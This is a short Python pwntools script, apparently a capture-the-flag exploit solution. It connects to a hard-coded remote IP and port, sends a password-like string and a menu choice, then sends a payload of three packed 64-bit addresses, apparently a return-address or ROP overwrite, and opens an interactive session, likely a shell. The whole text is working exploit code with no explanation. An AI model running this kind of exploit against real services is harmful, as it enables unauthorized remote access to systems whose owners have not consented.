from pwn import *

r = remote('110.10.212.139', 50410)

r.sendline("$W337k!++y")
r.sendline("3")

r.recvuntil("prefer")
payload = p64(0x14036) + p64(0x14029) + p64(0x14000)
r.send(payload)
r.interactive()